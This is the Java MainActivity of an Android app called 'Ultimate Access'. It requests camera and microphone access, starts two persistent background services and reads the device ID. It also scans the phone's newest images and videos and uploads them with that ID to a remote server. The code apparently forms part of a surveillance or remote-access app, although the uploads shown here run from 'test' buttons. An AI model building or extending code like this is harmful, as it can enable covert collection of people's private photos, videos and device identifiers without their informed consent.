package com.ultimate.access;

import android.Manifest;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.ultimate.access.services.UltimateBackgroundService;
import com.ultimate.access.network.DataSyncService;
import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;

    private TextView tvStatus;
    private TextView tvDeviceId;

    private Button btnServerSync;
    private Button btnExit;
    private Button btnTestUpload;
    private Button btnTestVideoUpload;

    String[] permissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvDeviceId = findViewById(R.id.tv_device_id);
        btnServerSync = findViewById(R.id.btn_server_sync);
        btnExit = findViewById(R.id.btn_exit);
        btnTestUpload = findViewById(R.id.btn_test_upload);
        btnTestVideoUpload = findViewById(R.id.btn_test_video_upload);

        checkPermissions();

        btnTestUpload.setOnClickListener(v -> {
            scanAllImages();
        });

        btnTestVideoUpload.setOnClickListener(v -> {
            scanAllVideos();
        });
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            onPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            onPermissionsGranted();
        }
    }

    public void onPermissionsGranted() {
        tvStatus.setText("App Running");

        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        tvDeviceId.setText("Device ID: " + androidId);

        startBackgroundService();
        startDataSyncService();

        btnServerSync.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ServerSyncActivity.class);
            startActivity(intent);
        });

        btnExit.setOnClickListener(v -> {
            Toast.makeText(MainActivity.this, "App Closed", Toast.LENGTH_SHORT).show();
            finishAffinity();
        });
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, UltimateBackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void startDataSyncService() {
        Intent intent = new Intent(this, DataSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void scanAllImages() {
        Log.d(TAG, "🔍 Scanning all images...");

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext() && count < 5) {
                    String path = cursor.getString(dataColumn);
                    Log.d(TAG, "📸 Found image: " + path);

                    File file = new File(path);
                    if (file.exists()) {
                        uploadToServer(file, "image");
                        count++;
                    }
                }

                Toast.makeText(this, "📤 Uploading " + count + " images", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "No images found", Toast.LENGTH_LONG).show();
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Scan error: " + e.getMessage());
            Toast.makeText(this, "Scan error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void scanAllVideos() {
        Log.d(TAG, "🔍 Scanning all videos...");

        String[] projection = {
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATE_ADDED
        };

        String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);

                while (cursor.moveToNext() && count < 5) {
                    String path = cursor.getString(dataColumn);
                    Log.d(TAG, "🎥 Found video: " + path);

                    File file = new File(path);
                    if (file.exists()) {
                        uploadVideoToServer(file, "video");  // 🔥 FIXED: "test_video" → "video"
                        count++;
                    }
                }

                Toast.makeText(this, "📤 Uploading " + count + " videos", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "No videos found", Toast.LENGTH_LONG).show();
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Scan error: " + e.getMessage());
            Toast.makeText(this, "Scan error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void uploadToServer(File file, String type) {
        try {
            RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
            MultipartBody.Part body = MultipartBody.Part.createFormData("file", file.getName(), requestFile);

            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);

            ApiService apiService = ApiClient.getClient().create(ApiService.class);
            apiService.uploadMedia(deviceIdBody, typeBody, body).enqueue(new Callback<ApiService.MediaResponse>() {
                @Override
                public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "✅ Image upload success: " + file.getName());
                    } else {
                        Log.e(TAG, "❌ Image upload failed: " + response.code());
                    }
                }

                @Override
                public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
                    Log.e(TAG, "❌ Image upload error: " + t.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "❌ Exception: " + e.getMessage());
        }
    }

    private void uploadVideoToServer(File file, String type) {
        try {
            RequestBody requestFile = RequestBody.create(MediaType.parse("video/*"), file);
            MultipartBody.Part body = MultipartBody.Part.createFormData("file", file.getName(), requestFile);

            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);

            ApiService apiService = ApiClient.getClient().create(ApiService.class);
            apiService.uploadMedia(deviceIdBody, typeBody, body).enqueue(new Callback<ApiService.MediaResponse>() {
                @Override
                public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "✅ Video upload success: " + file.getName());
                        Toast.makeText(MainActivity.this, "Video uploaded: " + file.getName(), Toast.LENGTH_SHORT).show();
                    } else {
                        Log.e(TAG, "❌ Video upload failed: " + response.code());
                        Toast.makeText(MainActivity.this, "Upload failed: " + response.code(), Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
                    Log.e(TAG, "❌ Video upload error: " + t.getMessage());
                    Toast.makeText(MainActivity.this, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "❌ Exception: " + e.getMessage());
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
}